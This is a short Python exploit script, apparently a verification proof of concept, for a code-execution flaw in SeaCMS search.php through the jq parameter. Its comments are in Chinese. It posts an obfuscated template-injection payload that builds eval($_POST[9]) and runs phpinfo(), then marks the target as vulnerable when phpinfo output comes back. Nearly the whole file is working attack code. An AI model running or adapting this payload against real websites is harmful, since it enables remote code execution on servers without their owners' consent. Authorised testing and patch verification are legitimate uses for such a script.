#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: seacms search.php 参数jq代码执行
referer: http://www.freebuf.com/vuls/150042.html
author: Lucifer
description: 文件search.php中,传入参数经过拼接造成代码执行。
'''
import sys
import json
import requests



class seacms_search_jq_code_exec_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type":"application/x-www-form-urlencoded",
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        vulnurl = self.url + "/search.php"
        post_data = "searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ph&9[]=pinfo();"
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"Configuration File (php.ini) Path" in req.text:
                return "[+]存在seacms search.php 参数jq代码执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = seacms_search_jq_code_exec_BaseVerify(sys.argv[1])
    testVuln.run()
